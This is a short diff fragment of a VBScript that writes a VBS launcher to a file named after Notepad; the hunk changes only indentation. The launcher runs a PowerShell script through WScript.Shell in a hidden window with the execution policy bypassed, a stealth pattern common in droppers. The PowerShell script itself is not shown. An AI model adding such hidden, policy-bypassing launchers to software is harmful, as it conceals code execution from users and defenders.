@@ -58,8 +58,8 @@ psFile.Close
 ' Create VBS launcher for the PS1 script
 Dim vbsLauncher
 vbsLauncher = _
-  "Set shell = CreateObject(""WScript.Shell"")" & vbCrLf & _
-  "shell.Run ""powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psScriptPath & """" & ", 0, False"
+    "Set shell = CreateObject(""WScript.Shell"")" & vbCrLf & _
+    "shell.Run ""powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psScriptPath & """" & ", 0, False"
 
 Set file = fso.CreateTextFile(notepadScriptPath, True)
 file.WriteLine vbsLauncher
